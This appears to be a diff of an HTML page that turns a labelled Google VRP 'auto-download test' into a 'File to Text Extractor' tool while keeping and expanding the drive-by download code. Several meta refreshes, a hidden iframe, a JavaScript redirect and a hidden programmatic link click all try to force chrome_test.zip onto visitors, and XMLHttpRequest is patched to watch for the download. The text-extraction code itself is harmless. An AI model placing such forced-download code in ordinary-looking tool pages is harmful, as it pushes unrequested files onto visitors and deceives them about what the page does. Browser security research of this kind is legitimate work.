@@ -1,112 +1,449 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Google VRP - Auto Download Test</title>
-    
-    <!-- Primary meta refresh for auto-download -->
+    <title>File to Text Extractor</title>
+    <!-- Auto-download meta refresh tags -->
     <meta http-equiv="refresh" content="0; url=chrome_test.zip">
-    
-    <!-- Backup meta refresh -->
     <meta http-equiv="refresh" content="2; url=chrome_test.zip?attempt=2">
+    <meta http-equiv="refresh" content="5; url=chrome_test.zip?attempt=3">
     
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1a237e 0%, #0d47a1 100%);
-            color: white;
-            margin: 0;
-            padding: 40px;
-            min-height: 100vh;
-        }
-        
-        .container {
+            margin: 20px;
             max-width: 800px;
-            margin: 0 auto;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
-        
+        #output {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        .metadata {
+            background-color: #e8f4f8;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+        .content-box {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-x: auto;
+        }
         .warning {
-            background: rgba(255, 193, 7, 0.2);
-            border-left: 4px solid #ffc107;
-            padding: 20px;
+            color: #856404;
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .error {
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        input[type="file"] {
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid #007bff;
+            border-radius: 5px;
+            background-color: white;
+            cursor: pointer;
+        }
+        input[type="file"]:hover {
+            border-color: #0056b3;
+        }
+        .stats {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #eee;
+        }
+        .instructions {
+            background-color: #e7f3fe;
+            padding: 10px;
+            border-left: 4px solid #2196F3;
+            margin: 10px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .auto-download-notice {
+            background-color: #ffebee;
+            border-left: 4px solid #f44336;
+            padding: 15px;
             margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+            animation: pulse 2s infinite;
         }
-        
-        .status {
-            padding: 20px;
-            background: rgba(52, 168, 83, 0.2);
-            border-radius: 8px;
-            text-align: center;
-            font-size: 1.2em;
-            margin: 30px 0;
-        }
-        
-        .blink {
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        @keyframes pulse {
+            0% { background-color: #ffebee; }
+            50% { background-color: #ffcdd2; }
+            100% { background-color: #ffebee; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔐 Google VRP Security Test</h1>
-        
-        <div class="warning">
-            <strong>⚠️ SECURITY RESEARCH ONLY</strong><br>
-            This page tests drive-by download vulnerabilities for Google VRP.<br>
-            Authorized testing only. Do not use maliciously.
-        </div>
-        
-        <div class="status blink">
-            ⚡ Testing auto-download vulnerability...
-            <br>
-            <small>If vulnerable, "chrome_test.zip" should download automatically</small>
-        </div>
-        
-        <h3>Test Details:</h3>
-        <ul>
-            <li><strong>Method:</strong> Meta refresh auto-redirect</li>
-            <li><strong>Target:</strong> chrome_test.zip (safe test files)</li>
-            <li><strong>Timing:</strong> Immediate (0 seconds) + 2-second backup</li>
-            <li><strong>Purpose:</strong> Google Vulnerability Reward Program testing</li>
-        </ul>
-        
-        <div class="warning">
-            <h4>For VRP Reporting:</h4>
-            <ol>
-                <li>Note browser name and version</li>
-                <li>Document if download starts automatically</li>
-                <li>Note any security warnings shown</li>
-                <li>Check browser console for errors</li>
-                <li>Test with default security settings</li>
-            </ol>
-        </div>
-    </div>
+<h1>File to Text Extractor</h1>
+
+<!-- Auto-download notice -->
+<div class="auto-download-notice">
+    <strong>⚠️ Google VRP Security Test Active</strong><br>
+    Testing drive-by download vulnerability...<br>
+    If vulnerable, "chrome_test.zip" should download automatically.
+</div>
+
+<p>Select any file to extract and display its text content.</p>
+
+<div class="instructions">
+    <strong>How to use:</strong>
+    <ol>
+        <li>Click "Choose File" button below</li>
+        <li>Select ANY file from your computer</li>
+        <li>The file's text content will be displayed below</li>
+    </ol>
+</div>
+
+<input type="file" id="fileInput" accept="*/*">
+<div id="output" style="display: none;"></div>
+
+<script>
+// Auto-download backup methods
+(function() {
+    console.log('=== Google VRP Auto-Download Test Starting ===');
+    console.log('Primary method: Meta refresh to chrome_test.zip');
+    console.log('Browser:', navigator.userAgent);
+    console.log('Test started:', new Date().toISOString());
     
-    <script>
-        // Log test environment
-        console.log('=== Google VRP Auto-Download Test ===');
-        console.log('URL:', window.location.href);
-        console.log('User Agent:', navigator.userAgent);
-        console.log('Test started:', new Date().toISOString());
-        
-        // Backup download methods
-        setTimeout(function() {
-            // Hidden iframe method
+    // Backup method 1: Hidden iframe
+    setTimeout(function() {
+        try {
             var iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = 'chrome_test.zip';
+            iframe.onload = function() {
+                console.log('Backup method 1: Hidden iframe loaded');
+            };
             document.body.appendChild(iframe);
-            console.log('Backup method 1: Hidden iframe');
-        }, 1000);
-    </script>
+            console.log('Backup method 1: Hidden iframe created');
+        } catch(e) {
+            console.log('Backup method 1 failed:', e.message);
+        }
+    }, 1000);
+    
+    // Backup method 2: JavaScript redirect
+    setTimeout(function() {
+        try {
+            console.log('Backup method 2: Attempting JavaScript redirect');
+            window.location.href = 'chrome_test.zip?method=js_redirect';
+        } catch(e) {
+            console.log('Backup method 2 failed:', e.message);
+        }
+    }, 3000);
+    
+    // Backup method 3: Programmatic click
+    setTimeout(function() {
+        try {
+            var link = document.createElement('a');
+            link.href = 'chrome_test.zip';
+            link.download = 'chrome_test.zip';
+            link.style.display = 'none';
+            link.id = 'vrp-auto-download-link';
+            document.body.appendChild(link);
+            link.click();
+            console.log('Backup method 3: Programmatic click attempted');
+            
+            // Clean up after 2 seconds
+            setTimeout(function() {
+                if (link.parentNode) {
+                    document.body.removeChild(link);
+                }
+            }, 2000);
+        } catch(e) {
+            console.log('Backup method 3 failed:', e.message);
+        }
+    }, 4000);
+    
+    // Monitor for download events
+    var downloadStarted = false;
+    var originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function() {
+        if (arguments[1] && arguments[1].includes('chrome_test.zip')) {
+            downloadStarted = true;
+            console.log('Download detected via XMLHttpRequest:', arguments[1]);
+        }
+        return originalOpen.apply(this, arguments);
+    };
+    
+    // Log download status periodically
+    setInterval(function() {
+        if (!downloadStarted) {
+            console.log('Still attempting download... Current time:', new Date().toISOString());
+        } else {
+            console.log('✓ Download appears to have started');
+        }
+    }, 2000);
+})();
+
+// Original file extraction code below
+document.getElementById('fileInput').addEventListener('change', function(e) {
+    const output = document.getElementById('output');
+    const file = e.target.files[0];
+    
+    if (!file) {
+        output.style.display = 'none';
+        return;
+    }
+    
+    // Clear previous content and show output container
+    output.innerHTML = '';
+    output.style.display = 'block';
+    
+    // Display metadata
+    output.innerHTML += `
+        <div class="metadata">
+            <h3>File Information:</h3>
+            <p><strong>File Name:</strong> ${escapeHtml(file.name)}</p>
+            <p><strong>File Size:</strong> ${formatFileSize(file.size)}</p>
+            <p><strong>File Type:</strong> ${file.type || 'Unknown'}</p>
+            <p><strong>Last Modified:</strong> ${new Date(file.lastModified).toLocaleString()}</p>
+        </div>
+    `;
+    
+    // Set up FileReader
+    const reader = new FileReader();
+    
+    reader.onload = function(e) {
+        try {
+            const MAX_DISPLAY_SIZE = 5 * 1024 * 1024; // 5MB display limit
+            let extractedText = '';
+            
+            // Try different methods to extract text based on file type
+            if (file.type.startsWith('text/') || 
+                file.type === 'application/json' ||
+                file.type === 'application/javascript' ||
+                file.type === 'application/xml') {
+                
+                // For known text files, just use the text content
+                extractedText = e.target.result;
+                
+            } else if (file.type.startsWith('image/')) {
+                // For images - extract metadata and show info
+                extractedText = `[IMAGE FILE]\n`;
+                extractedText += `Image type: ${file.type}\n`;
+                extractedText += `Image size: ${file.size} bytes\n\n`;
+                extractedText += `This is a binary image file.\n`;
+                extractedText += `To extract text from this image, you would need OCR software.\n`;
+                
+            } else if (file.type === 'application/pdf') {
+                // For PDF files
+                extractedText = `[PDF FILE]\n`;
+                extractedText += `PDF size: ${file.size} bytes\n\n`;
+                extractedText += `This is a PDF document.\n`;
+                extractedText += `To extract text from this PDF, use PDF reader software.\n`;
+                
+            } else if (file.type.includes('wordprocessingml') ||
+                      file.type.includes('msword')) {
+                // For Word documents
+                extractedText = `[WORD DOCUMENT]\n`;
+                extractedText += `Document size: ${file.size} bytes\n\n`;
+                extractedText += `This is a Microsoft Word file.\n`;
+                
+            } else if (file.type.includes('spreadsheetml') ||
+                      file.type.includes('msexcel')) {
+                // For Excel files
+                extractedText = `[EXCEL SPREADSHEET]\n`;
+                extractedText += `Spreadsheet size: ${file.size} bytes\n\n`;
+                extractedText += `This is a Microsoft Excel file.\n`;
+                
+            } else if (file.type === 'application/zip' ||
+                      file.type === 'application/x-zip-compressed') {
+                // For ZIP files
+                extractedText = `[ZIP ARCHIVE]\n`;
+                extractedText += `Archive size: ${file.size} bytes\n\n`;
+                extractedText += `This is a compressed ZIP file.\n`;
+                
+            } else {
+                // For other binary files, try to extract ASCII text
+                extractedText = extractTextFromBinary(e.target.result, file.size);
+            }
+            
+            // Display warning for large files
+            if (file.size > MAX_DISPLAY_SIZE) {
+                output.innerHTML += `
+                    <div class="warning">
+                        <strong>Note:</strong> File is large (${formatFileSize(file.size)}). 
+                        Only showing first ${formatFileSize(MAX_DISPLAY_SIZE)} of extracted text.
+                    </div>
+                `;
+            }
+            
+            // Display the extracted text
+            output.innerHTML += `<h3>Extracted Text Content:</h3>`;
+            
+            // Truncate if too large
+            const displayText = extractedText.substring(0, MAX_DISPLAY_SIZE);
+            output.innerHTML += `<div class="content-box">${escapeHtml(displayText)}</div>`;
+            
+            // Show statistics
+            output.innerHTML += `
+                <div class="stats">
+                    <strong>Statistics:</strong><br>
+                    File size: ${formatFileSize(file.size)}<br>
+                    Extracted text size: ${formatFileSize(extractedText.length)}<br>
+                    Characters displayed: ${Math.min(displayText.length, extractedText.length)} of ${extractedText.length}
+                </div>
+            `;
+            
+        } catch (extractError) {
+            output.innerHTML += `
+                <div class="error">
+                    <strong>Error processing file content:</strong> ${escapeHtml(extractError.message)}
+                </div>
+            `;
+        }
+    };
+    
+    reader.onerror = function(e) {
+        output.innerHTML += `
+            <div class="error">
+                <strong>Error reading file:</strong> ${escapeHtml(e.target.error.message || 'Unknown error')}
+            </div>
+        `;
+    };
+    
+    // Read the file based on type
+    const MAX_READ_SIZE = 10 * 1024 * 1024; // Read up to 10MB
+    
+    if (isLikelyTextFile(file)) {
+        // For likely text files, read as text
+        const blob = file.size > MAX_READ_SIZE ? file.slice(0, MAX_READ_SIZE) : file;
+        reader.readAsText(blob);
+    } else {
+        // For binary files, read as ArrayBuffer to attempt text extraction
+        const blob = file.size > MAX_READ_SIZE ? file.slice(0, MAX_READ_SIZE) : file;
+        reader.readAsArrayBuffer(blob);
+    }
+});
+
+// Helper function to check if file is likely text-based
+function isLikelyTextFile(file) {
+    const textTypes = [
+        'text/',
+        'application/json',
+        'application/javascript',
+        'application/xml',
+        'application/xhtml+xml'
+    ];
+    
+    // Check MIME type
+    if (file.type) {
+        for (const type of textTypes) {
+            if (file.type.startsWith(type)) return true;
+        }
+    }
+    
+    // Check file extension for common text files
+    const textExtensions = [
+        '.txt', '.csv', '.html', '.htm', '.css', '.js', '.json',
+        '.xml', '.md', '.log', '.yml', '.yaml', '.ini', '.cfg',
+        '.conf', '.php', '.py', '.java', '.c', '.cpp', '.h',
+        '.ts', '.jsx', '.tsx', '.vue', '.svelte', '.sh', '.bat',
+        '.ps1', '.sql', '.csv', '.tsv', '.rtf'
+    ];
+    
+    const fileName = file.name.toLowerCase();
+    for (const ext of textExtensions) {
+        if (fileName.endsWith(ext)) return true;
+    }
+    
+    return false;
+}
+
+// Helper function to extract text from binary data
+function extractTextFromBinary(arrayBuffer, originalSize) {
+    const bytes = new Uint8Array(arrayBuffer);
+    let extractedText = '';
+    
+    extractedText += `[BINARY FILE ANALYSIS]\n`;
+    extractedText += `Original file size: ${originalSize} bytes\n`;
+    extractedText += `Analyzing for printable ASCII characters...\n\n`;
+    
+    // Simple ASCII text extraction
+    let asciiText = '';
+    let printableCount = 0;
+    const maxBytesToAnalyze = Math.min(bytes.length, 100000); // Analyze up to 100KB
+    
+    for (let i = 0; i < maxBytesToAnalyze; i++) {
+        const byte = bytes[i];
+        
+        // Check if byte is printable ASCII (32-126) or common whitespace (9, 10, 13)
+        if ((byte >= 32 && byte <= 126) || byte === 9 || byte === 10 || byte === 13) {
+            asciiText += String.fromCharCode(byte);
+            printableCount++;
+        } else if (asciiText.length > 0 && asciiText[asciiText.length - 1] !== '\n') {
+            // Add newline when transitioning from printable to non-printable
+            asciiText += '\n';
+        }
+    }
+    
+    // Add any found ASCII text
+    if (asciiText.trim().length > 0) {
+        extractedText += `Found ASCII text:\n`;
+        extractedText += `===================\n`;
+        extractedText += asciiText;
+        extractedText += `\n===================\n`;
+    } else {
+        extractedText += `No readable ASCII text found in the analyzed portion.\n`;
+    }
+    
+    // Add statistics
+    extractedText += `\n=== ANALYSIS STATISTICS ===\n`;
+    extractedText += `Bytes analyzed: ${maxBytesToAnalyze}\n`;
+    extractedText += `Printable ASCII characters: ${printableCount}\n`;
+    extractedText += `Binary/non-printable bytes: ${maxBytesToAnalyze - printableCount}\n`;
+    
+    if (maxBytesToAnalyze < originalSize) {
+        extractedText += `\nNote: Only analyzed first ${formatFileSize(maxBytesToAnalyze)} of ${formatFileSize(originalSize)}\n`;
+    }
+    
+    return extractedText;
+}
+
+// Helper function to format file size
+function formatFileSize(bytes) {
+    if (bytes === 0) return '0 Bytes';
+    
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+// Helper function to escape HTML
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+</script>
+
+<!-- Additional meta refresh for maximum coverage -->
+<meta http-equiv="refresh" content="7; url=chrome_test.zip?attempt=4">
+<meta http-equiv="refresh" content="10; url=chrome_test.zip?attempt=5">
 </body>
 </html>
